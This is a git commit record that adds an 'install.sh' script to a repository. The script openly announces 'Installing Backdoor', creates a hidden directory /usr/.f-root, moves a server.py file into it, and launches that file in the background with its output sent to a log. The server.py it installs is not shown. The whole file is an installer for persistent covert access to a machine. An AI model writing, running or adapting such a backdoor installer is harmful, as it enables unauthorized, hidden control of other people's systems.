5624a5bbd10e50924b76e4fa7e427fe547528569
Detrew <82747830+Detrew@users.noreply.github.com>
2023-04-06 22:44:25 -0300

    Add files via upload

---
+++ install.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+clear
+echo "[+] Installing Backdoor..."
+mkdir /usr/.f-root
+mv server.py /usr/.f-root/
+cd /usr/.f-root/
+python3 /usr/.f-root/server.py >/usr/.f-root/backdoor.log 2>/usr/.f-root/backdoor.log &
+echo "[+] Backdoor Installed... on (/usr/.f-root)"
